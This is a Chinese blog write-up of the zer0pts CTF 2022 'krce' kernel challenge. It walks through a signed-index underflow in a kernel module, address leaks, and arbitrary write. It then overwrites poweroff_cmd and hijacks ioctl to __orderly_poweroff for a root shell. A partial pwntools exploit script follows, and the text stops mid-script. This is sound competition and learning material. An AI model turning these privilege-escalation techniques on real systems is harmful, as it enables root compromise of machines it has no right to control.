@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_180_180.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_32_32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_16_16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.33/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.imv1.me","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":true,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="第一次遇见限制用户态执行自由的内核题。ThinerDAS, will 和我一起拿到了这道题的一血。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="zer0pt ctf 2022 krce writeup">
+<meta property="og:url" content="http://blog.imv1.me/2022/03/21/zer0pt-ctf-2022-krce-writeup/">
+<meta property="og:site_name" content="V1me&#39;s Blog">
+<meta property="og:description" content="第一次遇见限制用户态执行自由的内核题。ThinerDAS, will 和我一起拿到了这道题的一血。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://res.cloudinary.com/v1mecn/image/upload/v1647873370/blog/Snipaste_2022-03-21_20-26-31_kdagnk.png">
+<meta property="og:image" content="https://res.cloudinary.com/v1mecn/image/upload/v1647873370/blog/Snipaste_2022-03-21_20-28-30_kpyrwx.png">
+<meta property="og:image" content="https://res.cloudinary.com/v1mecn/image/upload/v1647873370/blog/Snipaste_2022-03-21_21-11-35_jsbfjf.png">
+<meta property="article:published_time" content="2022-03-21T15:59:59.000Z">
+<meta property="article:modified_time" content="2024-02-28T06:02:00.000Z">
+<meta property="article:author" content="V1me">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="kernel">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://res.cloudinary.com/v1mecn/image/upload/v1647873370/blog/Snipaste_2022-03-21_20-26-31_kdagnk.png">
+
+
+<link rel="canonical" href="http://blog.imv1.me/2022/03/21/zer0pt-ctf-2022-krce-writeup/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://blog.imv1.me/2022/03/21/zer0pt-ctf-2022-krce-writeup/","path":"2022/03/21/zer0pt-ctf-2022-krce-writeup/","title":"zer0pt ctf 2022 krce writeup"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>zer0pt ctf 2022 krce writeup | V1me's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">V1me's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Talk is cheap, better to sleep.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">0x00 简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">0x01 漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">0x02 利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-EXP"><span class="nav-number">4.</span> <span class="nav-text">0x03 EXP</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="V1me"
+      src="/images/logo_ai_brown.png">
+  <p class="site-author-name" itemprop="name">V1me</p>
+  <div class="site-description" itemprop="description">Work in the dark to serve the light. Nothing is true, everything is permitted.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Roarcannotprogramming" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Roarcannotprogramming" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:z1991998920@gmail.com" title="E-Mail → mailto:z1991998920@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/RoarCantProgram" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;RoarCantProgram" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.ertuil.top/" title="https:&#x2F;&#x2F;blog.ertuil.top" rel="noopener" target="_blank">Ertuilの博客</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.wh98.me/" title="https:&#x2F;&#x2F;blog.wh98.me" rel="noopener" target="_blank">Hustcw's Blog</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://sqrt-1.me/" title="https:&#x2F;&#x2F;sqrt-1.me" rel="noopener" target="_blank">负一の平方根的博客</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://sirius1242.github.io/" title="https:&#x2F;&#x2F;sirius1242.github.io" rel="noopener" target="_blank">Sirius's Home</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.volltin.com/" title="https:&#x2F;&#x2F;blog.volltin.com" rel="noopener" target="_blank">Volltin's Blog</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.taoky.moe/" title="https:&#x2F;&#x2F;blog.taoky.moe" rel="noopener" target="_blank">Taoky's Blog</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://ibugone.com/" title="https:&#x2F;&#x2F;ibugone.com" rel="noopener" target="_blank">iBug's Home</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://ksqsf.moe/" title="https:&#x2F;&#x2F;ksqsf.moe" rel="noopener" target="_blank">ksqsf's Home</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="http://0xcc.me/" title="http:&#x2F;&#x2F;0xcc.me" rel="noopener" target="_blank">枸杞蒲蒻的博客</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://0x01.me/" title="https:&#x2F;&#x2F;0x01.me" rel="noopener" target="_blank">Hypercube's Home</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://blog.imv1.me/2022/03/21/zer0pt-ctf-2022-krce-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/logo_ai_brown.png">
+      <meta itemprop="name" content="V1me">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="V1me's Blog">
+      <meta itemprop="description" content="Work in the dark to serve the light. Nothing is true, everything is permitted.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="zer0pt ctf 2022 krce writeup | V1me's Blog">
+      <meta itemprop="description" content="第一次遇见限制用户态执行自由的内核题。ThinerDAS, will 和我一起拿到了这道题的一血。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          zer0pt ctf 2022 krce writeup
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-03-21 23:59:59" itemprop="dateCreated datePublished" datetime="2022-03-21T23:59:59+08:00">2022-03-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-02-28 14:02:00" itemprop="dateModified" datetime="2024-02-28T14:02:00+08:00">2024-02-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">第一次遇见限制用户态执行自由的内核题。ThinerDAS, will 和我一起拿到了这道题的一血。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h4 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h4><p>&ensp;&ensp;题目给出了内核模块 buffer.ko 和与之交互的 interface。和常规的内核题目不同，我们无法拿到完整的用户空间执行权限，只能通过 interface 与内核交互。所以这个题目的最大挑战是回到用户态后，如何拿到 shell。</p>
+<p>&ensp;&ensp;我们在内核空间利用部分使用了常规的解法: 将漏洞转化为任意地址读写，覆盖 <code>poweroff_cmd</code> 然后执行 <code>__orderly_poweroff</code> ，从而任意命令执行 (并不完全任意，在下文详述)。在最后的命令执行中出现了一些奇妙问题，让我们思考了很久，不过我们最后还是成功地拿到了 root shell。</p>
+<h4 id="0x01-漏洞"><a href="#0x01-漏洞" class="headerlink" title="0x01 漏洞"></a>0x01 漏洞</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">uint32_t</span> index;</span><br><span class="line">  <span class="type">uint32_t</span> size;</span><br><span class="line">  <span class="type">char</span> *data;</span><br><span class="line">&#125; <span class="type">request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *buffer[BUF_NUM];</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">buffer_new</span><span class="params">(<span class="type">uint32_t</span> index, <span class="type">uint32_t</span> size)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (index &gt;= BUF_NUM)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(buffer[index] = (<span class="type">char</span>*)kzalloc(size, GFP_KERNEL)))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">buffer_del</span><span class="params">(<span class="type">uint32_t</span> index)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (index &gt;= BUF_NUM)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!buffer[index])</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  kfree(buffer[index]);</span><br><span class="line">  buffer[index] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">buffer_edit</span><span class="params">(<span class="type">int32_t</span> index, <span class="type">char</span> *data, <span class="type">int32_t</span> size)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (index &gt;= BUF_NUM)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!buffer[index])</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(buffer[index], data, size))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">buffer_show</span><span class="params">(<span class="type">int32_t</span> index, <span class="type">char</span> *data, <span class="type">int32_t</span> size)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (index &gt;= BUF_NUM)</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!buffer[index])</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (copy_to_user(data, buffer[index], size))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>&ensp;&ensp;在 <code>buffer_edit</code> 和 <code>buffer_show</code> 函数中有明显的越界读写，可是越界读写只包括堆块后的物理直接映射区 (direct mapping area)。因为用户进程的内存页也会被映射到这块区域，我们考虑了直接溢出到用户进程空间的可能性。但是我们发现输入和输出十分缓慢，根本无法在限定时间内泄露或覆盖将近 30M 的空间。所以我们重新审计了代码。</p>
+<p>&ensp;&ensp;虽然在 <code>buffer_new</code> 函数中 <code>index</code> 使用的是 <code>uint32_t</code> 类型，但在后面的 <code>buffer_edit</code> 和 <code>buffer_show</code> 中却使用了 <code>int32_t</code> 类型。这样就会导致更为严重的数组下溢，此时内存布局如下 (without kalsr)。</p>
+<p><img data-src="https://res.cloudinary.com/v1mecn/image/upload/v1647873370/blog/Snipaste_2022-03-21_20-26-31_kdagnk.png"></p>
+<h4 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h4><p>&ensp;&ensp;在 <code>buffer</code> 前有指向内核基地址的 link，我们可以通过其泄露内核基地址 (kernel base) 和模块基地址 (kmod base) 。当然，如果有必要我们也可以泄露出内核堆地址。</p>
+<p><img data-src="https://res.cloudinary.com/v1mecn/image/upload/v1647873370/blog/Snipaste_2022-03-21_20-28-30_kpyrwx.png"></p>
+<p>&ensp;&ensp;之后我们通过地址 <code>0xffffffffc0002348</code> 所指向的 <code>0xffffffffc0002350</code> 将后面的部分原样覆盖，直到 buffer。将 buffer 覆盖为我们想要的地址之后就可以实现内核空间的任意读写 (arb read&#x2F;write)，当然我们现在已经只需要任意地址写 (arb write) 就可以了。</p>
+<p>&ensp;&ensp;我们选择覆盖 <code>poweroff_cmd</code> 为 <code>&quot;/bin/sh\x00&quot;</code> ，并且覆盖 <code>buffer</code> 模块的 <code>fops</code> 虚表的 <code>ioctl</code> 函数为 <code>__orderly_poweroff</code>。这样我们在下次执行 <code>ioctl</code> 时就能执行 <code>run_cmd(&quot;/bin/sh&quot;)</code> 以 root 执行 <code>/bin/sh</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __orderly_poweroff(<span class="type">bool</span> force)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    ret = run_cmd(poweroff_cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret &amp;&amp; force) &#123;</span><br><span class="line">        pr_warn(<span class="string">&quot;Failed to start orderly shutdown: forcing the issue\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * I guess this should try to kick off some daemon to sync and</span></span><br><span class="line"><span class="comment">         * poweroff asap.  Or not even bother syncing if we&#x27;re doing an</span></span><br><span class="line"><span class="comment">         * emergency shutdown?</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        emergency_sync();</span><br><span class="line">        kernel_power_off();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>&ensp;&ensp;到目前为止还一切顺利，一般来说到了这一步已经可以算做完成了利用了。但是… 现在的问题是我们没有办法和 shell 交互…</p>
+<p>&ensp;&ensp;我们想到我们的终端设备是 <code>/dev/console</code>。所以可以通过 <code>/bin/sh -i &lt;&gt; /dev/console &gt;&amp;0 2&gt;&amp;1</code> 来重定向输入输出。然而测试之后发现仍然不行。我们尝试了很多重定向的 trick 后发现执行 <code>/bin/sh -c sh&lt;/dev/console&gt;/dev/console</code>  可以显示出终端提示符 “#”，但是只能执行一条命令并且有时可以看到命令输出有时看不到。最后，我们发现是我们输入命令的同时会让 interface 进程结束，并执行 <code>poweroff -f</code>，打印输出和 poweroff 存在竞争…</p>
+<p>&ensp;&ensp;最后… 我们拿到 shell 后首先执行了 <code>rm /sbin/poweroff</code>…</p>
+<p><img data-src="https://res.cloudinary.com/v1mecn/image/upload/v1647873370/blog/Snipaste_2022-03-21_21-11-35_jsbfjf.png"></p>
+<h4 id="0x03-EXP"><a href="#0x03-EXP" class="headerlink" title="0x03 EXP"></a>0x03 EXP</h4><p>请原谅我不太想美化脚本了，所以你看到的是一个很丑陋的脚本…</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./interface&quot;</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    <span class="comment"># data_ = &quot;&quot;.join([hex(ord(x))[2:] for x in data])</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;data: &quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index, size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>): </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./start-qemu.sh&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn3.ctf.zer0pts.com&quot;</span>, <span class="number">9009</span>)</span><br><span class="line">cmd = p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">cmd, *args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">return</span> subprocess.run(cmd, shell=<span class="literal">True</span>, universal_newlines=<span class="literal">True</span>, executable=<span class="string">&#x27;/bin/bash&#x27;</span>, capture_output=<span class="literal">True</span>, *args, **kwargs)</span><br><span class="line">asi = run(cmd).stdout</span><br><span class="line">p.sendline(asi)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;4. 